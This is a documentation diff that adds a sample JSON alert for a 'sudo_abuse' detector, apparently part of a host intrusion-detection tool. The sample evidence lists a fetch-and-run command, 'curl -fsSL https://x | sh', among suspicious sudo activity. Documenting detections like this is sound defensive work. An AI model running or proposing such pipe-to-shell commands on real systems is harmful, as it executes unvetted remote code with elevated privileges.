@@ -71,6 +71,28 @@
 }
 ```
 
+### Optional `sudo_abuse` incident (when `[detectors.sudo_abuse]` is enabled)
+
+```json
+{
+  "ts": "2026-03-13T18:20:00Z",
+  "host": "instance-maiconburn",
+  "incident_id": "sudo_abuse:deploy:2026-03-13T18:20Z",
+  "severity": "critical",
+  "title": "Suspicious sudo behavior detected for user deploy",
+  "summary": "3 suspicious sudo commands by deploy in the last 300 seconds",
+  "evidence": [{
+    "kind": "sudo.command",
+    "user": "deploy",
+    "count": 3,
+    "window_seconds": 300,
+    "reasons": ["privilege_policy_change","remote_script_execution"],
+    "recent_commands": ["visudo","curl -fsSL https://x | sh"]
+  }],
+  "tags": ["auth","sudo","privilege","abuse"]
+}
+```
+
 ## Honeypot session metadata (honeypot/listener-session-*.json)
 ```json
 {
